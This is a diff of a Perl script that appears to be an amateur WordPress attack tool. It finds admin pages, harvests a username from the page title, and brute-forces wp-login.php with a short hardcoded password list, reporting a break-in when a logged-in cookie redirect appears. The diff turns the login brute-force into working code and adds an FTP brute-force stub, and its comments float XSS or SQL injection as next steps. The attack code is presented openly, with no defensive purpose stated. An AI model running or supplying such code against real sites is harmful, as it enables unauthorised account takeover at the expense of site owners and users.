@@ -21,7 +21,6 @@ use HTTP::Cookies;
 use LWP::Protocol::https;
 use Term::ANSIColor;
 use Net::DNS;
-use HTML::HeadParser;
 ###########################
 #External modules (trying to avoid using)
 ###########################
@@ -103,7 +102,7 @@ sub admin_find {
 	 my $res = $bot->request($req);
     #looks for the admin page
    if ($res->is_success) {
-      print color('green');
+      print color('bold green');
 	    print "[*]Found the admin page!!\n";
 	    print "[*] =>\t$hunt \n";
       print color('reset');
@@ -130,12 +129,12 @@ sub user_find {
   my $req = HTTP::Request ->new(GET=>$user); #build a request to get page content
   my $userhunt = $bot->request($req)->content; #sends the request then decodes the content so it doesn't load a hash
   if($userhunt =~/<title>([a-zA-Z\/][^>]+)<\/title>/){ #filtering for the username in the pages title
-    my $victim = $1;
-    print color('green');
+    my $victim = $1; #grabs the content between the <title> tags
+    print color('boldgreen');
     print "[*]Found user\n";
-    print color('bold green');
     print "[*] =>\t$victim \n";
-    brute_force();
+    print color('reset');
+    brute_force($victim); #sends the $victim data for brute forcing
   }
   else{
     print color('red');
@@ -145,31 +144,46 @@ sub user_find {
 }
 
 
-#Admin Page Brute force //Needs to be adjusted//Will be coming back to
+#Admin Page Brute force
 sub brute_force {
+  my $victim = shift;
   my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
-
   print color('yellow');
   print "++++++++++++++++++++++++++++++++++\n";
-  print "[*]Trying to break the login\n";
+  print "[*]Trying to break the Admin login\n";
   print "++++++++++++++++++++++++++++++++++\n";
   print color('reset');
-  #Iterating through the two arrays to try and guess the username and password
+  #Iterating through the array to try and guess the password
+  #Attempts to find a redirect between the login script and the actual admin page
   foreach (@passwds) {
       chomp(my $passwd = $_);
-      
-      my $login = $bot-> post($target, log => $user, pwd => $passwd)->as_string;
-      my $target = $host . '/wp-login.php';
-      my $auth = $host . '/wp-admin/';
-
-
+        my $target = $host . '/wp-login.php';
+        my $auth = $host . '/wp-admin/';
+        my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth]; #builds a POST request for the login page
+        my $attempt = $bot->request($login); #sends the actual request
+        my $status = $attempt-> as_string; #Converts the data from the HASH that the request sends to a STRING
+        if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){ #checks if the redirect has occurred
+          print color('bold green');
+          print "[*]Broke the site!\n";
+          print "[*] =>\t$victim \n";
+          print "[*] =>\t$passwd \n";
+          print color('reset');
+      }
+    }
+  }
 ####
 #Maybe XSS or SQL, don't know yet
 
 
 ####
 #FTP brute forcing
-sub ftp_brute {}
+sub ftp_brute {
+  print color('yellow');
+  print "++++++++++++++++++++++++++++++++++\n";
+  print "[*]Trying to break the FTP login\n";
+  print "++++++++++++++++++++++++++++++++++\n";
+  print color('reset');
+}
 
 
 ####
